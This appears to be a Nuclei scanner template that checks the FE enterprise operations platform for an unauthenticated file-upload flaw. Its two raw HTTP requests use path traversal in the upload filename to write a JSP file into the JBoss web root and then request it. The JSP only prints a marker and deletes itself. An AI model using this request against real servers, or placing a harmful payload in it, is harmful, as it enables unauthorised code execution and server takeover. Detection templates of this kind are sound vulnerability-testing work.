id: FE-uploadAttachmentServlet-upload
info:
  name: Template Name
  author: apple
  severity: critical
  description: 飞企互联-FE企业运营管理平台 /servlet/uploadAttachmentServlet接口处存在文件上传漏洞，未经身份验证的攻击者可以利用此漏洞上传恶意后门文件，获取服务器权限，进而控制整个web服务器。
  reference:
    - https://mp.weixin.qq.com/s/_q9hS__IQ0eo0K-OW031Xw
  tags: FE
variables:
  filename: "{{rand_base(6)}}"
  
http:
  - raw:
      - |-
        POST /servlet/uploadAttachmentServlet HTTP/1.1

        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKNt0t4vBe8cX9rZk
        ------WebKitFormBoundaryKNt0t4vBe8cX9rZk

        Content-Disposition: form-data; name="uploadFile"; filename="../../../../../jboss/web/fe.war/{{filename}}.jsp"
        Content-Type: text/plain
         <% out.println("whoisceshi");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
        ------WebKitFormBoundaryKNt0t4vBe8cX9rZk
        Content-Disposition: form-data; name="json"
         {"iq":{"query":{"UpdateType":"mail"}}}
        ------WebKitFormBoundaryKNt0t4vBe8cX9rZk--
      - |+
        GET /{{filename}}.jsp; HTTP/1.1
        Host: {{Hostname}}
        Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
        Sec-Ch-Ua-Mobile: ?0
        Sec-Ch-Ua-Platform: "macOS"
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

    matchers:
      - type: word
        part: body
        words:
          - whoisceshi
